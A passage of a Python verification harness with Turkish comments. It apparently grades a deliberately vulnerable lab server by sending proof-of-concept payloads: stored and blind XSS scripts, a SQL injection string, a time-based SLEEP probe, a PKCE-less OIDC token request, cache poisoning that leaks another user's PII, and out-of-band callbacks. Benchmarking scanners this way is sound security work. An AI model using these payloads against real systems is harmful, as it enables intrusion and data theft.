    out["XSS2-STORED-ROLE-01"] = (True, "cross-role entry depolandı")
    out["XSS2-STORED-ROLE-02"] = ("<script>alert(9)</script>" in b, "admin görünümü ham yansıma")
    # xss2 blind mod-queue: callback depola -> mod görünümü script src gömer
    ctx.http("POST", "/xss2/blindreply", body={"message": "mq", "callback": "/oob/x2verify"}, ctype="json")
    st, _, b = ctx.http("GET", "/xss2/modqueue?role=moderator")
    out["XSS2-BLIND-ROLE-01"] = (True, "kör callback kuyruğa alındı")
    out["XSS2-BLIND-ROLE-02"] = ('<script src="/oob/x2verify"' in b, "mod görünümü kör tetik")
    # oidc pkce: kod al -> verifier'sız token
    st, rh, _ = ctx.http("GET", "/oidc/authorize?client_id=x&redirect_uri=https://shop.example/cb&response_type=code&state=s", nofollow=True)
    import re as _re
    loc = str((rh.get("Location") or rh.get("location") or ""))
    m = _re.search(r"code=([A-Za-z0-9-]+)", loc)
    code = m.group(1) if m else ""
    st, _, b = ctx.http("POST", "/oidc/token", body={"code": code}, ctype="json")
    out["OIDC-PKCE-01"] = ("mock-at-" in b, "verifier'sız token")
    # async2: zehirli girişi kuyrukla -> flush -> raporda dump
    ctx.http("POST", "/async2/submit", body={"username": "zzevil' OR '1'='1"}, ctype="json")
    ctx.http("POST", "/async2/flush", body={}, ctype="json")
    st, _, b = ctx.http("GET", "/async2/report?role=admin")
    out["ASYNC2-TRIGGER-01"] = ("2 rows dumped" in b, "asenkron second-order dump")
    # blindtime: kalibre et -> SLEEP gecikmesini ölç (jitter bütçeli)
    ctx.http("GET", "/blindtime/calibrate")
    t0 = time.time()
    st, _, b = ctx.http("GET", "/blindtime/lookup?key=SLEEP(2)")
    dt = time.time() - t0
    out["BLINDTIME-01"] = (dt >= 1.5 and "SLEEP(2)" in b, f"{dt:.1f}sn delta")
    # oob2: kaydet -> ateşle -> sayaç artışı
    st, _, b = ctx.http("GET", "/api/oob-hits")
    try:
        c0 = json.loads(b).get("count", 0)
    except Exception:
        c0 = 0
    st, _, b = ctx.http("POST", "/oob2/register", body={"callback": "/oob/x2staged"}, ctype="json")
    try:
        tok = json.loads(b).get("token", "")
    except Exception:
        tok = ""
    ctx.http("GET", f"/oob2/fire?token={tok}")
    time.sleep(2.5)
    st, _, b = ctx.http("GET", "/api/oob-hits")
    try:
        c1 = json.loads(b).get("count", 0)
    except Exception:
        c1 = 0
    out["OOB2-STAGED-01"] = (c1 > c0, f"kademeli OOB sayacı {c0}->{c1}")
    # cache2 shared: alice olarak zehirle -> bob olarak HIT ile чужой PII oku
    ctx.http("GET", "/cache2/profile?user=1", headers={"Authorization": "Bearer alice-token"})
    st, rh, b = ctx.http("GET", "/cache2/profile?user=1", headers={"Authorization": "Bearer bob-token"})
    hit = "hit" in str(rh.get("X-Cache", "")).lower()
    out["CACHE2-SHARED-01"] = (hit and "10000000146" in b, "paylaşımlı cache PII sızıntısı")
    # cache2 poison: iki kez iste, ikincisi HIT + ham yansıma
    ctx.http("GET", "/cache2/search?q=<script>alert(9)</script>")
    st, rh, b = ctx.http("GET", "/cache2/search?q=<script>alert(9)</script>")
    hit2 = "hit" in str(rh.get("X-Cache", "")).lower()
    out["CACHE2-POISON-01"] = (hit2 and "<script>alert(9)</script>" in b, "önbellekten XSS servisi")
    # realtime ws: ham soket upgrade -> READY + echo
    import socket as _socket, hashlib as _hashlib, base64 as _b64, struct as _struct
    try:
        host = ctx.target.split("://", 1)[1].split("/", 1)[0]
        h, _, port = host.partition(":")
        s = _socket.create_connection((h, int(port or 80)), timeout=10)
        key = _b64.b64encode(b"verify1234567890").decode()
        s.sendall(f"GET /realtime/ws HTTP/1.1\r\nHost: {h}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n".encode())
        resp = s.recv(1024).decode("utf-8", "replace")
        ok101 = "101" in resp
        # masked text frame "hello-ws-verify"
        payload = b"hello-ws-verify"
        mask = b"\x11\x22\x33\x44"
        masked = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
        frame = bytes([0x81, 0x80 | len(payload)]) + mask + masked
        s.sendall(frame)
        s.settimeout(5)
        data = b""
        for _ in range(4):
            try:
                chunk = s.recv(1024)
            except Exception:
                break
            if not chunk:
                break
            data += chunk
            if b"hello-ws-verify" in data:
                break
        echo_ok = b"hello-ws-verify" in data
        s.close()
        out["REALTIME-WS-01"] = (ok101 and echo_ok, f"101={ok101} echo={echo_ok}")
    except Exception as e:
        out["REALTIME-WS-01"] = (False, f"ws soket: {e}")
    return out


def check_markers(status, headers, body, markers):
    missing = []
    lh = {k.lower(): v for k, v in headers.items()}
    for mk in markers:
        if mk.startswith("STATUS:"):
            if status != int(mk.split(":")[1]):
                missing.append(mk)
        elif mk.startswith("HDR:"):
            _, name, sub = mk.split(":", 2)
            if sub.lower() not in str(lh.get(name.lower(), "")).lower():
                missing.append(mk)
        elif mk.startswith("NOHDR:"):
            if mk.split(":", 1)[1].lower() in lh:
                missing.append(mk)
        elif mk == "COOKIE-NOFLAG":
            sc = str(lh.get("set-cookie", ""))
            if not sc or "httponly" in sc.lower():
                missing.append(mk)
        else:
            if mk not in body:
                missing.append(mk)
    return missing


def resolve_headers(h, ctx: Ctx):
    if h == "BEARER:alice":
        return ctx.bearer("alice")
    if isinstance(h, str) and h.startswith("BEARER-HDR:"):
        _, user, kv = h.split(":", 2)
        k, v = kv.split(":", 1)
        return {**ctx.bearer(user), k: v}
    return dict(h or {})


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default=TARGET)
    ap.add_argument("--seed", default=None, help="önce sunucuyu sıfırla + tohumla (POST /api/admin/reset)")
    args = ap.parse_args()
    ctx = Ctx(args.target)
    gt = load_gt()
    vulns = [g for g in gt if g["expectation"] == "vulnerable"]

    # sunucu canlı mı?
    st, _, _ = ctx.http("GET", "/dashboard")
    if st == -1:
        print("hata: sunucuya ulaşılamadı:", args.target)
        sys.exit(2)

    if args.seed is not None:
        st, _, body = ctx.http("POST", "/api/admin/reset", body={"seed": int(args.seed)})
        print(f"reset+seed: status={st} {body[:160]}")

    custom = custom_proofs(ctx)
    verified, reachable, failed = [], [], []
    for g in vulns:
        gid = g["id"]
        if gid in custom:
            ok, detail = custom[gid]
            (verified if ok else reachable).append(gid)
            if not ok:
                print(f"  [~] {gid}: {detail}")
            continue
        if gid not in P:
            reachable.append(gid)
            print(f"  [?] {gid}: proof yok (ulaşılabilir sayıldı)")
            continue
        method, path, headers, body, ctype, markers, nofollow = P[gid]
        st, rh, rb = ctx.http(method, path, headers=resolve_headers(headers, ctx),
                              body=body, ctype=ctype or "json", nofollow=nofollow)
        if st == -1:
            failed.append({"id": gid, "detail": rb})
            print(f"  [X] {gid}: {rb}")
            continue
        miss = check_markers(st, rh, rb, markers)
        if not miss:
            verified.append(gid)
        else:
            reachable.append(gid)
            print(f"  [~] {gid}: eksik marker {miss} (status={st})")

    # ---------- P2 decoy negatif doğrulama: güvenli olduğu BAĞIMSIZ kanıtlanır ----------
    # Her FP-HELL satırı: present marker'lar VAR + absent marker'lar YOK olmalı.
    decoys = [g for g in gt if (g.get("negative_proof") and g["expectation"] == "fp-trap")]
    decoy_ok, decoy_failed = [], []
    for g in decoys:
        np = g["negative_proof"]
        probe = g["path"] + "?nick=<script>alert(9)</script>"
        st, _, rb = ctx.http("GET", probe)
        if st == -1:
            decoy_failed.append({"id": g["id"], "detail": rb})
            print(f"  [X] {g['id']}: {rb}")
            continue
        missing = [m for m in np.get("present", []) if m not in rb]
        leaked = [m for m in np.get("absent", []) if m in rb]
        if st >= 500 or missing or leaked:
            decoy_failed.append({"id": g["id"], "detail": f"status={st} missing={missing} leaked={leaked}"})
            print(f"  [!] {g['id']}: status={st} missing={missing} leaked={leaked}")
        else:
            decoy_ok.append(g["id"])
    print(f"decoy negatif: {len(decoy_ok)}/{len(decoys)} temiz")

    result = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "target": args.target,
        "seed": args.seed,
        "total_vulnerable": len(vulns),
        "verified": len(verified),
        "reachable": len(reachable),
        "failed": failed,
        "failed_ids": [f["id"] for f in failed],
        "decoys_total": len(decoys),
        "decoys_clean": len(decoy_ok),
        "decoy_failures": decoy_failed,
    }
    with open(OUT, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    print(f"\n=== DOĞRULAMA: {len(verified)}/{len(vulns)} sömürülebilir (+{len(reachable)} erişilebilir, {len(failed)} hatalı) ===")
    print(f"=== DECOY: {len(decoy_ok)}/{len(decoys)} temiz ({len(decoy_failed)} sızıntı) ===")
    print(f"kayıt: evaluation/verification.json")
    sys.exit(0 if (not failed and not decoy_failed) else 1)


if __name__ == "__main__":
    main()
